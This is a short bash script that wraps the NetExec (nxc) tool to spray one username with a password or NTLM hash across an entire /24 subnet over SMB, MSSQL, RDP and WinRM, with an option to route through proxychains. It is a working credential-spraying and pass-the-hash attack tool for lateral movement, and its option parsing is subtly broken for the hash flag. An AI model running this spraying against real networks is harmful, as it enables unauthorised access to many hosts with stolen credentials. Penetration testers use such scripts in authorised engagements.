#!/usr/bin/env bash

# Initialize variables
ip=""
user=""
password=""
hash=""
domain=""

usage() {
    echo -e "Usage: $0 -i [ip] -u [user] -p <password> -h <hash> -d <domain> [-P]\n"
    echo "Flags:"
    echo -e "\t-P: to enable proxychains4"
    exit 1
}

run_cmd() {
    echo "[*] $@"
    $@
    echo -e "[+] Done\n"
}

# Parse arguments using getopts
while getopts i:u:p:d:Ph flag
do
    case "${flag}" in
        i) ip=${OPTARG}
        ;;
        u) user=${OPTARG}
        ;;
        p) password=${OPTARG}
        ;;
        h) hash=${OPTARG}
        ;;
        d) domain=${OPTARG}
        ;;
        P) PROXYCHAINS="true"
        ;;
        *) 
            usage
            ;;
    esac
done

if [[ -z $ip || -z $user ]]; then
    usage
fi

NXC=""
if [[ "$PROXYCHAINS" == "true" ]]; then
    nxc=$(which nxc)
    NXC="sudo proxychains4 ${nxc}"
else
    NXC=$(which nxc)
fi

iprange="${ip}/24"

if [[ -n "$password" ]]; then
    for proto in smb mssql rdp winrm; do
        run_cmd "${NXC} $proto $iprange -u $user -p $password --continue-on-success"
        run_cmd "${NXC} $proto $iprange -u $user -p $password --continue-on-success --local-auth"
    done
    exit 0
fi

if [[ -n "$hash" ]]; then
    for proto in smb mssql rdp winrm; do
        run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success"
        run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success --local-auth"
    done
    exit 0
fi